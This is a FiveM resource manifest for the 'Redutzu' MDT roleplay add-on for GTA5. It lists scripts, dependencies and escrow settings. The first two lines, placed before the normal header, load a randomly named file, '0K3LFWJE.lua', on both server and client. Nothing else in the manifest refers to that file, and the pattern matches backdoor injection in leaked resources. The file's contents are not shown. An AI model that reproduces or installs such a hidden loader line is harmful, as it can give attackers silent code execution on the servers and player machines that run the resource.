server_script "0K3LFWJE.lua"
client_script "0K3LFWJE.lua"
fx_version 'cerulean'
game 'gta5'

author 'Redutzu'
version '2.2.7'
description 'Take roleplay to another level with the most advanced MDT on FiveM'
github 'https://github.com/redutzu'

lua54 'yes'

ui_page 'nui/dist/index.html'

shared_scripts {
    '@ox_lib/init.lua', -- uncomment this if you use QBox
    'config/config.lua',
    'shared/init.lua',
    'shared/utils.lua',
    'shared/locales.lua'
}

client_scripts {
    '@qbx_core/modules/playerdata.lua', -- uncomment this if you use QBox
    'client/custom/**',
    'client/utils/**',
    'client/modules/**',
    'client/*'
}

server_scripts {
	'@oxmysql/lib/MySQL.lua', -- or '@mysql-async/lib/MySQL.lua',
    'config/upload.lua',
    'server/cache.lua',
    'server/custom/**',
    'server/modules/**',
    'server/*'
}

escrow_ignore {
    'shared/locales.lua',
    'server/custom/**',
    'client/custom/**',
    'config/*'
}

files {
    'nui/dist/**',
    'config/permissions.json'
}

dependencies {
    '/assetpacks',
    'redutzu-mdt-prop',
    'screenshot-basic',
    'oxmysql' -- or 'mysql-async'
}

dependency '/assetpacks'